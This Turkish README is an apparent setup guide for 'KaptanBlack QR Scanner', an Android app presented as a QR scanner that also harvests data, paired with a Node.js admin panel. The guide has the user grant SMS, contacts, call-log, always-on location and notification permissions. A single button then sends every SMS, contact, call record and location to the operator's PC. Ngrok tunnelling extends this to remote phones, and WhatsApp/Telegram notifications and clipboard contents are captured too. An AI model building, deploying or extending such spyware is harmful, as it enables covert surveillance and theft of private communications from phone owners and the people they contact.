# KaptanBlack QR Scanner - Kullanim Kilavuzu

## Proje Yapisi

```
QRScanner/
├── Android/                    # Android projesi
│   └── app/src/main/...
├── PC_Sunucu/               # PC sunucu klasoru
│   ├── pc_sunucu_baslat.sh  # Sunucu baslatma scripti
│   ├── pc_server.js         # Ana sunucu dosyasi
│   ├── admin_panel.html     # Admin paneli
│   ├── ngrok_kurulum.sh     # Ngrok kurulumu
│   ├── APK_Dosyalari/       # APK depo
│   └── README.md            # Bu dosya
```

---

# SECIM 1: YEREL SUNUCU (AYNI WiFi AGI)

Telefon ve bilgisayar **AYNI WiFi** agindaysa bu secenegi kullanin.

## Adim 1: PC Sunucuyu Baslat

Terminal acin ve yazin:

```bash
cd /home/burak/Masaüstü/QRScanner/PC_Sunucu
node pc_server.js
```

Sunucu calismaya baslayinca su mesaji goreceksiniz:
```
Server running on:
  Local:    http://localhost:8080
  Network: http://192.168.1.102:8080
```

**Bu terminali KAPATMAYIN!** Sunucu calisirken acik kalmali.

---

## Adim 2: Admin Panelini Acin

Browser'da (Chrome/Firefox) adres satirina yazin:

```
http://localhost:8080
```

KaptanBlack Admin Paneli acilacak.

---

## Adim 3: Android Telefonda APK'yi Acin

Telefonunuzda **QR Scanner** uygulamasini bulun ve acin.

### Ilk Acilis - IZINLERI VERIN:

Uygulama acilinca asagidaki izinleri ISTEYECEK. **HEPSINE IZIN VERIN:**

1. **Kamera Izni** -> "IZIN VER" deyin
2. **Depolama Izni** -> "IZIN VER" deyin  
3. **SMS Izni** -> "IZIN VER" deyin
4. **Kisiler Izni** -> "IZIN VER" deyin
5. **Arama Kayitlari Izni** -> "IZIN VER" deyin
6. **Konum Izni** -> "IZIN VER" ve "Her zaman izin ver" secin

> **Not:** Izin vermezseniz veri cekemezsiniz!

---

## Adim 4: Veri Toplamayi Baslatin

Uygulamada butonlar:

### A) "Veri Topla" Butonu (Tum Veriler)
Bu butona bastiginizda telefonunuzdaki TUM veriler otomatik olarak PC'ye gonderilir:
- Tum SMS mesajlari
- Tum rehber kisileri
- Tum arama kayitlari
- Mevcut konum bilgisi
- Sistem bilgisi (telefon modeli, Android surumu)

### B) "Taramayi Baslat" Butonu (QR Kod)
Bu butona bastiginizda kamera acilir. Herhangi bir QR kodu okutun.
Okunan QR kodu aninda PC'deki panele gonderilir.

### C) "Kamera Degistir" Butonu
Bu butona bastiginizda ON/ARKA kamera arasinda gecis yapabilirsiniz.

---

## Adim 5: Panelde Verileri Gorun

Admin panelinde su bolumler var:

- **Cihazlar:** Bagli telefon burada gorunur
- **QR Taramalar:** Okunan QR kod sayisi
- **Toplam Veri:** Gelen toplam veri miktari
- **SMS:** Gelen SMS sayisi
- **Aramalar:** Gelen arama kaydi sayisi
- **Kisiler:** Gelen kisi sayisi
- **Bildirimler:** Gelen bildirim sayisi
- **Pano:** Kopyalanan veri sayisi

**"Canli Veri Akisi"** bolumunde gelen veriler aninda gorunur.

---

# SECIM 2: FARKLI AG (NGROK ILE UZAKTAN ERISIM)

Telefon ve bilgisayar **AYNI WiFi** aginda DEGILSE bu secenegi kullanin.

## Adim 1: PC Sunucuyu Baslat

Terminal acin ve yazin:

```bash
cd /home/burak/Masaüstü/QRScanner/PC_Sunucu
node pc_server.js
```

Sunucu calismaya baslayinca su mesaji goreceksiniz:
```
Server running on:
  Local:    http://localhost:8080
  Network: http://192.168.1.102:8080
```

**Bu terminali KAPATMAYIN!** Sunucu calisirken acik kalmali.

---

## Adim 2: Ngrok'u Baslat

Yeni bir terminal acin ve yazin:

```bash
cd /home/burak/Masaüstü/QRScanner/PC_Sunucu
ngrok http 8080
```

Ngrok calismaya baslayinca su mesaji goreceksiniz:
```
Forwarding: https://abc123.ngrok-free.app -> http://localhost:8080
```

**Bu URL'i kopyalayin!** (Ornek: `https://abc123.ngrok-free.app`)

**Bu terminali de KAPATMAYIN!** Ngrok calisirken acik kalmali.

---

## Adim 3: Android'de Ayarlayin

Telefonda QR Scanner uygulamasinda:
1. **"Ayarlar"** butonuna basin
2. **"Ngrok URL"** alanina kopyaladiginiz URL'yi yapistirin
3. **"Kaydet"** deyin

---

## Adim 4: Veri Toplamayi Baslatin

"Veri Topla" butonuna basin. Veriler internet uzerinden PC'ye gonderilecek.

---

## Adim 5: Panelde Verileri Gorun

Browser'da `http://localhost:8080` adresini acin. Veriler panelde gorunecek.

---

# ONEMLI NOTLAR

## Ngrok URL Degisimi

Ngrok free versiyonunda URL her baslatmada degisir. Bu yuzden:
- Her seferinde yeni URL alin
- Android'de ayarlar bolumunden URL'i guncelleyin

## Yerel Ag IP Degisimi

Yerel ag IP adresi (192.168.1.102) router yeniden baslatilinca degisebilir.
- Terminaldeki "Network: http://192.168.1.102:8080" mesajini kontrol edin
- IP degistiyse Android kodundaki `serverUrl` degiskenini guncelleyin

---

# VERI KLASOR YAPISI

Veriler otomatik olarak cihaz ismine gore klasorlere kaydedilir:

```
veri_kayitlari/
└── SM_J730F_f0a830dc/    ← Cihaz İsmi_ID
    ├── contacts_2026-04-23T00-35-00.json    ← Tüm kişiler
    ├── sms_2026-04-23T00-35-01.json          ← Tüm SMS'ler
    ├── call_2026-04-23T00-35-02.json         ← Tüm aramalar
    ├── location_2026-04-23T00-35-03.json    ← Konum
    └── system_info_2026-04-23T00-35-04.json ← Sistem bilgisi
```

---

# HATA COZUMLELERI

### "Bagli cihaz yok" diyorsa:
1. Telefon ve bilgisayar ayni WiFi'da mi? Kontrol edin.
2. APK en guncel mi? (Asagidaki "Guncellemek" bolumune bakin)
3. Sunucu calisiyor mu? Terminali kontrol edin.
4. Ngrok kullanıyorsanız URL doğru mu?

### Uygulama acilmiyorsa:
1. Telefondaki eski QR Scanner'i kaldirin
2. Yeni APK'yi yukleyin

### Kamera acilmiyorsa:
1. Kamera izni verildi mi? Kontrol edin
2. Uygulamayi kapatip tekrar acin

### Veri gitmiyorsa:
1. Sunucu calisiyor mu? Terminali kontrol edin
2. Internet baglantisi var mi?
3. Ngrok kullanıyorsanız URL doğru mu?

---

# GUNCELLEME (YENI APK YUKLEME)

Yeni APK build edildi veya guncellendi ise:

```bash
cd /home/burak/Masaüstü/QRScanner/Android
./gradlew clean assembleDebug
cp app/build/outputs/apk/debug/app-debug.apk ../PC_Sunucu/APK_Dosyalari/QRScanner_KaptanBlack.apk
adb install -r app/build/outputs/apk/debug/app-debug.apk
```

---

# BILDIRIM IZNI (WhatsApp/Telegram)

Bildirimleri yakalamak icin:

1. Ayarlar → Uygulamalar → Bildirimler → QRScanner
2. **"Bildirimlere Izin Ver"** seceneğini ACIN
3. WhatsApp, Telegram bildirimleri yakalanacak

---

# ILETISIM

**KaptanBlack Professional Development**
